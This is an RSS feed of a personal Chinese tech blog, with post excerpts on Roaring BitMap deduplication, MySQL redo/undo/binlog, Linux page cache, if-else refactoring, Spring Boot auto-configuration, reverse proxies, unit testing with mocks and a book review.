<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Hadoo&#39;s Blog</title>
    <link>https://hanchao666.top/posts/</link>
    <description>Recent content in Posts on Hadoo&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 24 Oct 2023 16:05:54 +0800</lastBuildDate><atom:link href="https://hanchao666.top/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>少年，别再迷茫</title>
      <link>https://hanchao666.top/posts/do-not-worry/</link>
      <pubDate>Tue, 24 Oct 2023 16:05:54 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/do-not-worry/</guid>
      <description>一级标题 二级 三级 一级2 一级3 </description>
    </item>
    
    <item>
      <title>大数据量系统去重方案</title>
      <link>https://hanchao666.top/posts/big-data-deduplicate/</link>
      <pubDate>Tue, 12 Sep 2023 17:55:14 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/big-data-deduplicate/</guid>
      <description>0.概述 大数据去重是一个经典的业务场景，包括统计网站登录用户的UV、网页爬虫对URL去重等，下面对其解决方案进行调研学习。
可以将去重情景分成几个维度：
实时还是离线 是否要求绝对精准 单进程还是分布式 下面分别介绍几种常见的去重方式
1.方案 1.1 HashMap&amp;mdash;&amp;gt;BitMap&amp;mdash;&amp;gt;Roaring BitMap 最原始的方案就是使用HashMap，在业务代码中经常使用HashMap来保存key-value的映射关系，当要判断一个key是否已经存在时，使用map.get()获取对应的value来进行判断。
随着数据量的增大，这种数据结构就会暴露出弊端。加入我们创建的hashMap为Intege类型，那么存储一个元素需要使用4个Btye的空间，如果我们存在2亿个元素，那么机器的内存肯定是扛不住的。及时是使用Byte类型的hashMap，2亿个元素也需要(2亿 * 1 / 1024 / 1024)M的内存空间。
使用HashMap每次存储的value就是一个boolean类型的value，使用Byte这样的空间显的有些浪费，使用0 1就可以解决，在计算机世界里面，最小的表示0 1的存储单元是bit，1 byte = 8 bit，这样我们就可以把存储空间进行压缩。
BitMap的最大占用空间由元素中最大的数值决定，如果待判断元素分布的极为不均匀，例如[1,1000000]，那么BitMap也需要开辟出1000000这样大的存储空间，有点浪费。虽然bit已经是可以使用的最小单位了，但还是可以采用压缩算法，及Roaring BitMap(压缩位图)，相比于BitMap，这种结构在性能和空间利用率上有了显著的提升。
压缩位图的主要流程：
我们将 32-bit 的范围 ([0, n)) 划分为 2^16 个桶，每一个桶有一个 Container 来存放一个数值的低16位； 在存储和查询数值的时候，我们将一个数值 k 划分为高 16 位(k % 2^16)和低 16 位(k mod 2^16)，取高 16 位找到对应的桶，然后在低 16 位存放在相应的 Container 中； 容器的话， RBM 使用两种容器结构： Array Container 和 Bitmap Container。Array Container 存放稀疏的数据，Bitmap Container 存放稠密的数据。即，若一个 Container 里面的 Integer 数量小于 4096，就用 Short 类型的有序数组来存储值。若大于 4096，就用 Bitmap 来存储值。 举个例子：</description>
    </item>
    
    <item>
      <title>聊聊博客</title>
      <link>https://hanchao666.top/posts/about-blog/</link>
      <pubDate>Fri, 08 Sep 2023 10:52:26 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/about-blog/</guid>
      <description>正值博客迁移，随便写写。
我与博客 初识
大学期间就开始接触博客了，平时学习也有记录笔记的习惯，发布的第一篇博客是在大二暑假，当时闲着没事在家刷题，那时主要的搜索手段还是CSDN，于是心血来潮的就把当时的解题思路发布出去了，具体时间是2019.8.12，
CSDN不愧是国内开发者解决问题的聚集之地(可能StackOverFlow访问不到)，后来又陆续发布了几篇，收获到了不错的曝光度，当时每天看着浏览量和站内月排名逐渐上升，还是挺有成就感的，最高的一篇浏览量动态规划解决最长公共子序列(Java实现)目前已经到了2W+，由此可见，培养一个习惯还是要有一定激励机制的。
开始折腾
大二结束，大三就开始准备秋招了，这时认识了一个B站 up主：CodeSheep。这个老羊头当时还没现在这么鸽，更新的还是比较频繁的，他当时推出了一系列的博客相关视频，包括写博客的好处、如何搭建等，于是爱折腾、还想装个B的我开始了博客自建之路。
接触Halo
当时搭建博客除了想提升一下逼格之外，还有一个刚需，找实习简历上缺项目！在学校做的辣鸡HR管理系统、图书管理系统，我自己都觉得拿不出手，所以，我就去找了一下基于Java生态的博客，Halo进入了我的视线。
于是乎开始了第一次动态博客的建站，使用腾讯云学生套餐买服务器，应用部署，主题调参，域名注册&amp;hellip;&amp;hellip;
搭建成功开门大吉，当时在博客上面陆续更新了很多文章，主要内容都是面试相关的哈哈哈，还是挺有成就感的。
不过随着后面的折腾，已经很久没用halo了，刚才又看了一眼Halo现状，好家伙，士别三日当刮目相待了呀。
被Handsome主题勾引到了Typecho
这是第二次搭建动态博客，不得不说一下Handsome主题，这是主题作者的网站。
这是一款付费主题，印象中是80+。它有自己的管理后台，可以进行多维度调参，当时看到这个主题之后，就立刻心动了。所以男人真的靠不住，喜新厌旧呸呸呸。当时完全是瞎折腾，折腾的很累很费时，但是在部署成功，将主题的参数布局调换成自己满意的状态之后，真的是乐在其中，有点理解为什么小时候妹妹那么喜欢娃娃换装游戏了。。当然，这也是我这次迁移之前的博客，目前是这个样子的：
还是挺好看的吧，嘿嘿。
回归本源
直到遇见平凡，才是唯一的答案。
这也是为什么我要进行这次的博客迁移。
to be honest，其实最直接的原因，是腾讯云的服务器又要到期了，但是续费的价钱已经没有新人首单优惠了，，
一年这个价钱，啥条件啊，我的钱还得攒着娶媳妇呢。。
所以所以，我对写博客这件事进行了一次思考，思考的集中点主要在于，动态博客和静态博客的选择。
二者具体的优劣势这里不再做赘述，可以参考上述超链接。
没有最好的，只有最适合自己的。
我需要的博客的到底是什么样子的？
一个内容展示平台，分享观点，记录思考。 好的书写体验，类比RPC，写博客的书写体验以及发布流程，就像在本地书写一样。 低成本，包括部署运维成本，发布构建成本。 其他没了。 我觉的不管怎么选择，**博客的唯一核心竞争力，是内容，而不是展现形式。**所以可以发现，很多技术大牛的博客，主题都很Simple、Stupid，但是不影响人家发布影响行业的技术观点。看Martin Fowler的主页，连个分类、TOC、归档都没有，但人家福勒爷就是在这上面发布的重构。。
所以我的最终方案是：Hugo + Github Pages。
为什么写博客 根据我个人的理解，瞎说说。
一言以蔽之，主动学习。
在一开始觉得写博客是一件浪费时间的事情，学完就记在脑子里呀，正经人谁写这玩意啊，赶紧再学其他的，他不香吗？
我的思想转变，是受两件事情的影响，其实都是一个道理。
主动学习理论。 主动学习是一个方法论，区别于被动学习。之前看过一个理论，对于信息或者知识的接收，在不同环节是逐渐衰减的(信噪比)，例如，
你听到的 &amp;gt; 能听的进去的 &amp;gt; 能理解的 &amp;gt; 能记住的 &amp;gt; 能说出来的 &amp;gt; 能教会别人的。
所以在很多情况下，你以为已经掌握的一个理论，让你说出来的话，就会吞吞吐吐的，根本原因就是思路还不清晰，缺少细节，而细节才见功夫。所以很多人在交代任务时，除了高情商的说一句“不知道我说清楚了吗”，还会再来一句，“你重复一遍呗”，就是这个道理。
主动学习，就是一种深度学习，是理论和实践两条腿走路的学习。
职场导师 进入职场之后，进行过若干次专题技术分享，即针对自己遇到的问题，分析出难点，评估水平方案，给出最佳实践，最后举一反三提炼方法论，这个过程是导师教给我的，有一句话印象很深，“所谓的技术分享，其实最大的收获者是你自己”。确实是这么一回事儿。真正的高手，能用通俗易懂的语言把问题描述清楚并教会给别人，如果你能把别人也教会，说明就是真的掌握了，写博客，就是一场知识的传播教学。
再多说点，关于体系化思考。
从高中开始，老师就一直强调知识要进行体系化，为什么要体系化？
我们平时接触到的知识，大多都是信息孤岛，只有整合孤岛，才有可能触类旁通。以目前的市面数据库产品为例，虽然每年都会涌现出新的技术产品，但是万变不离其宗的是底层数据结构，如果你知道它的底层数据结构，就立马能知道这个产品是什么尿性。例如，以B+树作为存储结构，那么他就是对查询更友好，因为写入可能会涉及到页的分裂；如果以日志作为存储结构，那么顺序追加的方式会对写入更加友好。
三维世界的道理，万变不离其宗，物理规律逃不出声光热力电，世间道理相通，计算机科学也是如此。体系化的知识体系，可以视作一颗树形结构，最终的道理就是Root节点，由Root节点开始，道生一，一生二&amp;hellip;&amp;hellip;
扯远了。。。
写什么 根据黄金圈法则，上面已经介绍了关于博客的How和Why，下面来聊一聊What。
我给自己博客定义的Slogan是：记录思考，见证成长。只要是对成长有帮助的，只要是经过自己思考的，都可以，内容题材不限，也不会强行限制在技术博客，正如上述所说，道理都是相同的。
具体内容上，我不会写一些入门性的文章，例如软件的安装、API的调用等，RTFM！，我主要会进行专题形式的记录，以某一问题为契机，以解决实际问题为目的，问题驱动式学习，不会空谈技术说教，因为技术如果一旦脱离了应用场景，一文不值。
同时呢，生活不是只有技术，我也会不定期的来一些和我兴趣爱好密切相关的话题，例如跑步、摄影==。</description>
    </item>
    
    <item>
      <title>MySQL三大日志(binlog、redo log和undo log)</title>
      <link>https://hanchao666.top/posts/mysql-binlog-redolog-undolog/</link>
      <pubDate>Thu, 07 Sep 2023 18:56:01 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/mysql-binlog-redolog-undolog/</guid>
      <description>概述 MySQL 日志 主要包括错误日志、查询日志、慢查询日志、事务日志、二进制日志几大类。其中，比较重要的还要属二进制日志 binlog（归档日志）和事务日志 redo log（重做日志）和 undo log（回滚日志）。
下面分别介绍一下这三种日志： redo log（重做日志）、binlog（归档日志）、两阶段提交、undo log （回滚日志）。
redolog redo log（重做日志）是 InnoDB存储引擎独有的，它让 MySQL拥有了崩溃恢复能力。
比如 MySQL 实例挂了或宕机了，重启时，InnoDB存储引擎会使用 redo log恢复数据，保证数据的持久性与完整性。
MySQL 中数据是以页为单位，你查询一条记录，会从硬盘把一页的数据加载出来，加载出来的数据叫数据页，会放入到 Buffer Pool 中。后续的查询都是先从 Buffer Pool 中找，没有命中再去硬盘加载，减少硬盘 IO 开销，提升性能。更新表数据的时候，也是如此，发现 Buffer Pool 里存在要更新的数据，就直接在 Buffer Pool 里更新。然后会把“在某个数据页上做了什么修改”记录到重做日志缓存（redo log buffer）里，接着刷盘到 redo log 文件里。
理想情况，事务一提交就会进行刷盘操作，但实际上，刷盘的时机是根据策略来进行的。
每条 redo 记录由“表空间号+数据页号+偏移量+修改数据长度+具体修改的数据”组成
刷盘时机
InnoDB 存储引擎为 redo log 的刷盘策略提供了 innodb_flush_log_at_trx_commit 参数，它支持三种策略：
0 ：设置为 0 的时候，表示每次事务提交时不进行刷盘操作 1 ：设置为 1 的时候，表示每次事务提交时都将进行刷盘操作（默认值） 2 ：设置为 2 的时候，表示每次事务提交时都只把 redo log buffer 内容写入 page cache innodb_flush_log_at_trx_commit 参数默认为 1 ，也就是说当事务提交时会调用 fsync 对 redo log 进行刷盘</description>
    </item>
    
    <item>
      <title>Page Cache and Buffer Cache</title>
      <link>https://hanchao666.top/posts/page-cache-and-buffer-cache/</link>
      <pubDate>Fri, 28 Jul 2023 14:23:32 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/page-cache-and-buffer-cache/</guid>
      <description>区分 先上一个Linux的文件I/O系统图， 上图红色部分就是page cache，由此可见其存在于os kernel的内存区域。内存管理分配的基本单位是page，page cache由多个页组成，对应于磁盘上的若干数据块。
Linux上的页供用户访问的页有两种：
File-backed pages：文件备份页ME1693830146631.png也就是page cache中的page Anonymous pages：匿名页是进程运行的内存空间，包括方法栈、局部变量表等 在终端执行free命令，
其中cached列表示的就是page cache的占用量，而buffers列表示当前的buffer cache占用量。
二者的区别用一句话解释就是：page cache用于缓存文件的页数据，buffer cache用于缓存块设备(如磁盘)的块数据。
页是逻辑上的概念，因此page cache是与文件系统同级的； 块是物理上的概念，因此buffer cache是与块设备驱动程序同级的。 在Linux 2.4版本的内核之前，二者是完全分离的。但块设备大多是磁盘，磁盘上的数据大多又通过文件系统来组织，这样导致数据被缓存的两次，
在Linux 2.4版本内核之后，两块缓存近似融合到了一起：如果一个文件的页加载到了page cache，那么buffer cache只需要维护块指向页的指针就可以了。只有那些没有文件表示的块，或者绕过了文件系统直接操作（如dd命令）的块，才会真正放到buffer cache里。
因此，现在提起page cache，基本就是同时指的是两者。
预读机制 操作系统为基于page cache的读缓存机制提供了预读机制，例如，
用户线程仅仅请求读取磁盘上文件 A 的 offset 为 0-3KB 范围内的数据，由于磁盘的基本读写单位为 block（4KB），于是操作系统至少会读 0-4KB 的内容，这恰好可以在一个 page 中装下。 但是操作系统出于局部性原理会选择将磁盘块 offset [4KB,8KB)、[8KB,12KB) 以及 [12KB,16KB) 都加载到内存，于是额外在内存中申请了 3 个 page； ME1693830198441.png
上图中，应用程序利用 read 系统调动读取 4KB 数据，实际上内核使用 readahead 机制完成了 16KB 数据的读取。
优势 page cache能够加速数据访问，如果能够命中缓存，就可以缩短直接访问磁盘的gap，
同时基于操作系统为page cache提供的预读机制，基于程序的局部性原理，可以减少磁盘加载缓存次数，进而提高吞吐量。</description>
    </item>
    
    <item>
      <title>烂怂if-else代码优化方案</title>
      <link>https://hanchao666.top/posts/dirty-if-else-optimize/</link>
      <pubDate>Sun, 04 Jun 2023 14:20:11 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/dirty-if-else-optimize/</guid>
      <description>0.问题概述 代码可读性是衡量代码质量的重要标准，可读性也是可维护性、可扩展性的保证，因为代码是连接程序员和机器的中间桥梁，要对双边友好。Quora 上有一个帖子： “What are some of the most basic things every programmer should know?”
其中：
Code that’s hard to understand is hard to maintain.
Code that’s hard to maintain is next to useless.
也强调了&amp;quot;easy understand&amp;quot;代码的重要性。
写这篇文章的契机是在研读Apache ShenYu项目时，看到了很大一坨的if else语句，如下：
这里并非评论这段代码写法有问题，因为我还并没有深入到项目细节之中，可能这已经是多轮优化的结果嘞。
但是这个多层if else的形式引发了我的思考，因为我也曾在项目代码中引入过如此繁重的if else结构，并在Code Review中被指出了问题。从那以后，我对if else的最大容忍层数就是三层。
我把大量if else的场景按照深度和广度两个维度划分为两种情况：
嵌套层级过深 平铺范围太广 下面就讨论一下，当代码中存在大量这样结构的代码的时候，该如何优化？
1.解决方案 1.1 尽早返回 又称卫语句，即Guard Statement
WikiPedia:
In computer programming, a guard is a boolean expression that must evaluate to true if the program execution is to continue in the branch in question.</description>
    </item>
    
    <item>
      <title>打破黑盒看SpringBoot自动装配原理</title>
      <link>https://hanchao666.top/posts/learn-about-springboot-autowire/</link>
      <pubDate>Wed, 31 May 2023 18:30:39 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/learn-about-springboot-autowire/</guid>
      <description>SpringBoot凭借高度的封装和简单易上手的性质大大的降低了JavaEE开发的门槛，但作为开发者，我们要对系统中的组件做到知根知底，来增加可控性。下面就打破黑盒，来看一下SpringBoot是如何实现自动装配的。
我们现在提到自动装配的时候，一般会和 Spring Boot 联系在一起。但是，实际上 Spring Framework 早就实现了这个功能。Spring Boot 只是在其基础上，通过 SPI 的方式，做了进一步优化。
SpringBoot 定义了一套接口规范，这套规范规定：SpringBoot 在启动时会扫描外部引用 jar 包中的 META-INF/spring.factories文件，将文件中配置的类型信息加载到 Spring 容器（此处涉及到 JVM 类加载机制与 Spring 的容器知识），并执行类中定义的各种操作。对于外部 jar 来说，只需要按照 SpringBoot 定义的标准，就能将自己的功能装置进 SpringBoot。
SpringBoot的易用性是比较出来的。对于Spring的使用，需要完成大量繁琐的显式配置，而SpringBoot通过少量注解和一些简单必要的配置就OK。自动装配可以简单理解为：通过注解或者一些简单的配置就能在 Spring Boot 的帮助下实现某块功能。
SringBoot是如何实现自动装配的
首先来看一下SpringBoot的核心注解：@SpringBootApplication
@Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan public @interface SpringBootApplication 大概可以把 @SpringBootApplication看作是 @Configuration、@EnableAutoConfiguration、@ComponentScan 注解的集合。根据 SpringBoot 官网，这三个注解的作用分别是：
@EnableAutoConfiguration：启用 SpringBoot 的自动配置机制 @Configuration：允许在上下文中注册额外的 bean 或导入其他配置类 @ComponentScan： 扫描被@Component (@Service,@Controller)注解的 bean，注解默认会扫描启动类所在的包下所有的类 ，可以自定义不扫描某些 bean。如下图所示，容器中将排除TypeExcludeFilter和AutoConfigurationExcludeFilter。 @EnableAutoConfiguration 是实现自动装配的重要注解，我们以这个注解入手。
@AutoConfigurationPackage @Import({AutoConfigurationImportSelector.class}) public @interface EnableAutoConfiguration{} 自动装配核心功能的实现是通过AutoConfigurationImportSelector类来实现，而 AutoConfigurationPackage的作用是将main包下的所有组件注册到容器中(AutoConfigurationPackage注册第三方组件， ComponentScan用来注册被 Component标注的组件)。</description>
    </item>
    
    <item>
      <title>汤师爷翻译一下，什么TMD叫反向代理！</title>
      <link>https://hanchao666.top/posts/fucking-reverse-proxy/</link>
      <pubDate>Thu, 13 Apr 2023 14:18:04 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/fucking-reverse-proxy/</guid>
      <description>对于反向代理这个概念理解的一直不是很透彻，今天让汤师爷给咱翻译一下：
正文开始：
首先看一下，什么是正向代理。
假如说我想买一个iphone14 pro，但是没钱，于是决定去找东哥借钱。可想而知，根本行不通。情急之下回头一想，想起了大学同学小杨是东哥的宿迁老乡，于是我就找到小杨，委托他帮我去找东哥借钱，最后事成了。不过东哥并不知道这笔钱是借给我的，东哥是借给小杨的，最后小杨把钱交给我。这里的小杨就扮演了一个非常关键的角色，就是代理，也可以说是正向代理，小杨替我借钱这件事，这个行为东哥不知道真正借钱的人是谁，这点很关键。
回到计算机世界，其实我们常说的代理就是正向代理，它隐藏了真实的请求客户端，服务端不知道真正的客户端是谁，客户端请求的服务都被代理服务器代理来请求，这也就是科学上网代理服务器的工程原理，由于GFW的存在，国内使用浏览器访问Google时，会被残忍的block，有多少包丢多少包，于是可以在国外(不是朝鲜就行qaq)搭建一台代理服务器，让代理去帮助请求Google，代理把请求返回的相应结构再返回给我。
咳咳，反正博客没人看就多说点，代理服务器推荐搬瓦工CN2 GIA，线路稳定速度快，赶在黑色星期五可以便宜很多，咳咳，，
反向代理
还是举个例子。
在我们拨打10086客服电话的时候，一个地区的10086客服可能有很多个，但我们并不关心电话那头的是哪一个，可能是GG，也可能是MM，但我们关心的是问题能不能得到专业的解答，只要拨通了10086的总机号码，电话那头总有人回答，这里的10086总机号码就是反向代理。
回到计算机世界，反向代理隐藏了真实的服务端，当我们请求www.baidu.com的时候，就像拨打10086一样，背后可能有成千上万台服务器为我们服务，但具体是哪一台，我们不知道，也不关心。我们只需要把请求发给反向代理服务器，他会帮我们把请求转发到真实的服务器那里去。Nginx就是一个很经典的反向代理服务器，可以用来做负载均衡。
最后一句话总结：
两者的区别在于代理的对象不一样，正向代理代理的对象是客户端，反向代理代理的对象是服务端。</description>
    </item>
    
    <item>
      <title>【代码精进之路】- 重构&amp;单元测试</title>
      <link>https://hanchao666.top/posts/refactor-unit-test/</link>
      <pubDate>Tue, 13 Dec 2022 14:08:07 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/refactor-unit-test/</guid>
      <description>博客开了一个新的菜单，名为【代码精进之路】，主要用于记录学习与实践过程中关于代码质量的思考与经验总结。
本篇文章题目较大，后续会不断进行内容的补充完善，文章内容主要出自笔者本人重构项目的思考总结，以及极客时间《设计模式之美》的学习内容。
一 概述 什么是重构？ 软件设计大师、《重构》作者Martin Fowler如此定义：”重构是一种对软件内部结构的改善，目的是在不改变软件的可见行为的情况下，使其更容易理解，修改成本更低。“
为什么要重构？ 根据熵增定律，所有事物都在向着无规律、无序和混乱发展，例如屋子不收拾会变乱、手机会越来越卡、耳机线会变凌乱&amp;hellip;&amp;hellip;同样的，代码质量也逃不过。项目在演进，随着需求的增多，代码在不停的堆砌，同时也在朝着混乱的方向发展，如果没有人为代码质量负责，那么量变引起质变，代码腐败到维护成本甚至会高过重新开发一套新代码的成本，这会影响到项目的迭代与交付效率，往大了说，在之前国内互联网圈地跑马阶段，迭代交付的慢就会错过商机，所以，重构是一个研发团队保持稳定高效输出的有力手段。
重构无法避免。优秀的代码或架构绝不是一开始就设计好的，而是演进出来的。我们无法100%遇见未来的需求，也没有足够的精力、时间、资源为遥远的未来买单，所以随着系统的演进，我们要接受重构是一个常态化行为。
什么时候重构？ 持续重构。
这是一种可持续、可演进的方式，这要求我们时刻具有持续重构意识，才能避免开发初期就进行过度设计而追求完美、避免代码维护过程中质量的下降，可以在日常迭代开发中掺入”小动作“，例如在修改、添加某个功能代码的时候，可以顺手把不符合编码规范、不好的设计重构一下，把它和单元测试、CodeReview一样，作为一种开发习惯。
如何重构？ 按照规模，重构可以笼统的分为大型重构和小型重构，
对于大型重构，往往涉及的模块、代码较多，很可能会出现越改越多、越改越乱的情况，另外在如今迭代周期普遍较为紧张的情况下，也很难找出一整块完整的时间来进行整个项目的重构。
一个建议就是大型重构一定要提前做好完善的重构计划，有条不紊的分阶段进行，每个阶段完成一小部分代码的重构，然后提交、测试、运行，发现没问题后，再继续进行下一阶段，尽量保证代码仓库中的代码一直处于可运行、逻辑正确的状态。每个阶段都要控制好重构的影响范围以及持续时间，小步快走的方式很重要！
而小规模层次的重构，因为影响范围小，改动耗时短，可以随时穿插着做。
二 重构的技术保障手段-单元测试 ！！！单元测试！！！
主观因素：重构开发者的技术实力 客观因素：科学化技术手段 从主观上来看，需要开发者对所重构的业务和代码要有足够的了解，也需要开发者技术够硬，能hold的住，这没的说。
从客观上来看，最可落地执行、最有效的保证重构不出错的手段，就是单元测试。当重构完成之后，如果新的代码仍然能够通过单元测试，那就说明代码原有逻辑的正确性未被破坏，原有的外部可见行为没变。
下面来主要探讨一下【单元测试】那些事。
单元测试的测试对象是类或函数，用来测试一个类或函数是否都按预期的逻辑执行，由程序员自己来书写以验证自己写的代码的正确性。
单元测试可能会被很多开发团队或工程师忽略，笔者以前同样认为编写并维护单元测试是一件”没必要“的事，然而被现实给上了一课，测试以及用户反馈的一个个bug，绝大多数都是由于代码的方法中的”小问题“导致的，这些问题或者是由于粗心笔误、或者是由于修改后未及时回归，所以说，做好测试的第一步也是最重要的一步就是：要重视单元测试。搞好单元测试，Bug Free不是梦！
除了让我们及时有效的以fail-fast的方式发现代码逻辑问题，单测也能够帮助我们发现设计上的问题，如果你垫的单元测试写起来很吃力，那往往意味着代码设计的不够合理，例如第三方依赖mock不掉、大量使用静态函数或全局变量、代码高度耦合等，代码的可测试性也是衡量代码质量的重要参考因素哦。
另外在我们刚刚接触一个新的项目时，如学习某开源项目，那么推荐的一个方式就是从单测入手，阅读单测可以帮助我们快速的熟悉代码，单元测试一般是一个独立的小功能，好的单测也是见名知意的，借助于此我们可以不再像无头苍蝇一样寻找代码的逻辑链路，可以更省力的知道代码实现了什么功能。
不要觉得有了测试团队，写单测就是浪费时间，现在很多公司的开发模式还仍然是写好代码直接提交，然后丢给黑盒测试拼命的测，测出问题就反馈给开发团队修改，测不出的问题就留在线上出问题了再修复，作为一名有追求的开发者，我们要对自己写的代码负责。
三 单元测试如何做 上述两节较为理论化，下面以一个实际的案例来说明。
代码如下所示，其中Transaction是一个简化后的电商系统交易类，用来记录每笔订单交易的情况。Transaction中的execute()负责执行转账操作，将钱从买家的钱包转到卖家的钱包中。真正的转账操作是WallRpcService的RPC服务来完成的。除此以外，代码中还涉及一个分布式锁DistributedLock单例类，用来避免Tracnsaction并发执行，导致用户的钱被重复转出。
针对核心逻辑execute()方法，设计出以下6个测试用例：
设计完测试用例，当我们将他们落实到具体的代码实现时，却有很多不顺利的地方，以第一个测试用例为例，其代码实现为：
execute()函数的执行依赖两个外部服务，一个是RedisDistributedLock，一个是WalletRpcService，导致这个用例存在以下问题：
这个方法对于两个外部服务是强依赖的，如果这两个服务没有提供线下测试环境，我们可能需要自己搭建。 即使RPC服务有线下测试环境，但如果服务提供者是另外一个团队维护，我们输入正确的入参，结果也不一定返回成功，即RPC的对端也可能是不可靠的，这需要联调。 Redis、RPC依赖网络通信，耗时可能比较长，对单测的执行性能会有影响。 网络的中断、超时、Redis、RPC服务的不可用，都需要考虑。 而单元测试的目的，是为了测试程序员自己编写的代码逻辑是否正确，并非是端到端的集成测试，无需验证所依赖的外部系统的逻辑正确性。所以，我们需要将被测代码与外部系统依赖解耦，采用的方式就是mock。所谓mock就是以假乱真，用mock的服务输出我们想要的数据。
mock的方式主要有两种，框架mock和手动mock。框架mock例如@Mokito，可以简化代码的编写，这里演示一下使用手动mock的方式。
通过继承WalletrpcService类，并且重写其中的moveMoney()函数的方式来实现mock，使其返回我们任意想要的数据，而不进行真正的网络通信。
接下来使用依赖注入的方式优化一下execute()函数的可测试性，因为WalletRpcService是通过new(0的方式创建的，我们无法对其实现进行替换，可以借助依赖注入这个神器，将WalletrpcService对象的创建反转给上层逻辑，在外部创建好之后，再注入到Transaction中，如下所示：
然后在单元测试中WalletRpcService实现类进行替换，
接下来看一下RedisDistributedLock，这家伙更棘手，因为它是一个单例类，相当于一个全局变量，我们无法通过继承并重写的方式mock，也无法通过依赖注入的方式来替换。
如果RedisDistributedLock是我们自己维护的，可以将其实现修改为非静态单例类的模式，或抽出一个接口，比如IDistributedLock，让RedisDistributedLock实现这个接口，我们也就可以通过依赖注入的方式对其进行替换，可是如果这个类不是我们自己维护的，怎么办？
我们可以对上锁这部分逻辑重新封装一下，如下：
代码重构后，使用如下的单元测试代码，即可mock掉外部依赖，测试我们自己的代码逻辑了！
加下来再看一个测试用例3：交易已过期(createTimeStamp超过14天)，交易状态设置为EXPIRED，返回false。写出的单测代码如下：
看起来没啥问题，把时间戳设置为14天前，transaction一定处于过期状态，但是如果createTimeStamp没有暴露set方法呢？例如createTimeStamp的业务定义是在交易生成时自动获取的系统时间，不应该放开修改权限那怎么测？
对于时间和随机函数等这种”未决行为“，一般的处理方式是将未决行为逻辑进行重新封装，将是否交易过期的逻辑封装到isExpired()函数即可，代码如下：
针对重构之后的代码，新的测试用例代码如下：
破坏代码可测试性的行为 未决行为 未决行为逻辑即代码的输出是随机的或者是不确定的，比如跟时间、随机数有关的代码，一个有效的解决方法就是封装不确定性。
全局变量 全局变量是一种面向过程的编码风格，对代码的可测试性非常不友好，因为每个测试用例都可以对全局变量进行修改导致测试用例之间的数据耦合。
静态方法 静态方法也是一种面向过程的编码风格，这也会影响代码的可测试性，静态方法不容易mock。
复杂继承 如果父类需要mock某个依赖对象才能进行单元测试，那所有的子类、孙子类在编写单测的时候，都需要mock这个依赖对象，如果对于层次很深、结构复杂的继承关系，那么越底层的子类需要mock的对象可能就会越多，麻烦的很。
所以推荐尽可能的使用组合而非继承来组织类之间的关系，类之间的结构层次比较扁平，在编写单元测试的时候只需要mock类所组合依赖的对象即可。
四 大型重构之解耦 为什么要解耦</description>
    </item>
    
    <item>
      <title>《代码的艺术》读书笔记</title>
      <link>https://hanchao666.top/posts/the-art-of-code-reading-note/</link>
      <pubDate>Wed, 24 Aug 2022 14:16:28 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/the-art-of-code-reading-note/</guid>
      <description>书读的断断续续，所以读书笔记写的也是零零散散
本书的作者是章淼老师，第一次邂逅是在他的个人公众号《章老师说》中，当时看了几节公开课，了解到章老师是清华大学计算机博士、百度代码规范委员会主席，于是就抱着崇拜的心理在京东下单了这本《代码的艺术》。
首先这本书的书名就深得我心，一直以为，把代码写好真的是一门艺术，也是一名工程师应该有的追求，好的代码，如诗般优雅。在如今业务飞快发展的时代，工程师如果能够在时间紧、任务繁重的开发周期内，重视代码的可读性、可维护性，完善好相关文档，这种“慎独”式开发，真的是难能可贵。
本书的主要内容主要围绕的是软件工程能力，这也是我大学本科的专业课程。曾经枯燥无味，应付期末考试的大学课程，如今在工作一年、经历了多次项目迭代、踩过很多次坑之后，让我对软件工程肃然起敬，看来人的见识格局还是会随着时间、阅历不断发展的。
那什么是工程能力？
使用系统化的方法，在保证质量的前提下，更高效率的为客户/用户持续交付有价值的软件或服务的能力。
短短的一句话，信息量巨大，且足以让我为之探索并努力整个职业生涯。
系统化的方法 正如盖楼有很成熟的工序和方案，软件工程也是一个非常专业的领域。一个软件的生命周期，由产品设计、需求分析、系统设计、编码实现、质量保证、项目管理、系统运维和产品运营等多个模块组成，环环相扣。
保证质量 在《软件开发的201个原则》中，作为一个软件项目，最重要也是最根本的原则，就是质量第一。没有保证质量，不管你使用多么巧妙的设计方案、多么优雅的设计模式，都狗屁不是，站不住脚的。但事实上是软件开发过程中的缺陷是无处不在、在所难免的，所以能够通过严谨的编码意识、科学的测试方法以及成熟的工程经验来把控项目质量，也是评判一个工程师是否优秀的标准。
更高效率 说到效率，这里以我的自身经验，说一下入职以来导师对我的贯彻，因为那是进入职场第一天，所以尤其深刻。即：工具化思维，尤其在从事技术服务公司的平台类产品中，显的更为重要。会不会使用工具，是人和动物的根本区别，这是初中历史书的一句必考点。如今人类社会文明之高，很大程度上得益于对于工具的不断封装和升级改造，将既有智慧和既有能力沉淀为工具，在下一阶段进行复用，不断的迭代向前，这就是人类的牛逼之处，也是发展的趋势。正如我们想从北京开车到上海，不会去单独买个方向盘、买四个轮子，而是直接开着买来的车即可；正如互联网如火如荼的沉淀中台；正如公共框架对开发工作的简化&amp;hellip;&amp;hellip;
研发的效率可提升的空间很大，且永无止境，我相信只要用心关注项目的细节，多想、敢想，总会有可以提高效率的点。
持续 软件项目的研发和维护都是长周期的(去除部分圈钱上市跑路的项目)，一定得有长期维护、长期服务、持续改进优化的准备。这里我主要想到的就是重构。重构是伴随着项目整个生命周期的，好的项目并不是一开始设计出来的，而是演进出来的，在项目发展初期，可能由于业务理解不准确、未充分考虑后续兼容等，工程师可能会让项目的设计有所偏差，但毕竟谁都无法预测未来，所以我们要时刻警惕工程中的坏味道，持续重构，小步快跑，让项目的发展处于一个稳定高效的加速度中，而不是每次都从0到1的推到重来，这很重要，也是一个架构师的职责。
